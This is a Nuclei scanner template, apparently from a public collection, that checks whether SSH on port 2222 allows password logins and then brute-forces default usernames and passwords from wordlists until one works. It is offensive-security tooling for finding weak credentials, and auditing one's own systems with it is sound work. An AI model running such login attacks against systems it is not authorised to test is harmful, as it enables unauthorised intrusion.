id: ssh-brute-2222

info:
  name: SSH - Default Logins
  author: tarunKoyalwar
  severity: critical
  metadata:
    max-request: 223
    shodan-query: port:22
  tags: js,ssh,default-login,network

javascript:
  - pre-condition: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      var response = c.ConnectSSHInfoMode(Host, Port);
      // only bruteforce if ssh allows password based authentication
      response["UserAuth"].includes("password")
    code: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      c.Connect(Host,Port,Username,Password);
    args:
      Host: "{{Host}}"
      Port: "2222"
      Username: "{{usernames}}"
      Password: "{{passwords}}"
    threads: 10
    attack: pitchfork
    payloads:
      usernames: helpers/wordlists/ssh-users.txt
      passwords: helpers/wordlists/ssh-passwords.txt
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "response == true"
          - "success == true"
        condition: and